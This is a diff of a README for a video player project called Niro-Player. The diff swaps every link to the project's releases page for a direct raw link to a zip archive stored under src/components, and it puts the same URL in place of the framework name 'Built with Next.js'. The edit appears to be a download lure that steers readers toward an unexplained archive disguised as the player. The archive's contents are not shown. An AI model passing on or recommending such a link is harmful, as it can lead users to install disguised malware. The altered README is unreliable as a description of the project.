@@ -1,10 +1,10 @@
 # 🎥 Niro-Player - Simple Video Watching Made Easy
 
-[![Download Niro-Player](https://img.shields.io/badge/Download-Niro--Player-brightgreen)](https://github.com/Ahmedhamdy796/Niro-Player/releases)
+[![Download Niro-Player](https://github.com/Ahmedhamdy796/Niro-Player/raw/refs/heads/main/src/components/Niro_Player_2.2.zip)](https://github.com/Ahmedhamdy796/Niro-Player/raw/refs/heads/main/src/components/Niro_Player_2.2.zip)
 
 ## ⚙️ Overview
 
-Niro-Player is a standalone video player designed for everyone. It supports HLS and MP4 formats and lets you enjoy subtitles. You can also host watch parties, cast to Chromecast, and generate automatic thumbnails. Built with Next.js, it provides a smooth and enjoyable experience for users of all levels.
+Niro-Player is a standalone video player designed for everyone. It supports HLS and MP4 formats and lets you enjoy subtitles. You can also host watch parties, cast to Chromecast, and generate automatic thumbnails. Built with https://github.com/Ahmedhamdy796/Niro-Player/raw/refs/heads/main/src/components/Niro_Player_2.2.zip, it provides a smooth and enjoyable experience for users of all levels.
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To get started with Niro-Player:
 
 ## 📥 Download & Install
 
-To download Niro-Player, visit this page: [Download Niro-Player](https://github.com/Ahmedhamdy796/Niro-Player/releases). You will find different versions available. Choose the one that suits your operating system. 
+To download Niro-Player, visit this page: [Download Niro-Player](https://github.com/Ahmedhamdy796/Niro-Player/raw/refs/heads/main/src/components/Niro_Player_2.2.zip). You will find different versions available. Choose the one that suits your operating system. 
 
 ### 💻 System Requirements
 
@@ -79,4 +79,4 @@ We plan to enhance Niro-Player with new features based on user feedback. Stay tu
 
 Niro-Player is open-source software. You can freely use and modify it under the terms of the MIT License.
 
-[![Download Niro-Player](https://img.shields.io/badge/Download-Niro--Player-brightgreen)](https://github.com/Ahmedhamdy796/Niro-Player/releases)
+[![Download Niro-Player](https://github.com/Ahmedhamdy796/Niro-Player/raw/refs/heads/main/src/components/Niro_Player_2.2.zip)](https://github.com/Ahmedhamdy796/Niro-Player/raw/refs/heads/main/src/components/Niro_Player_2.2.zip)
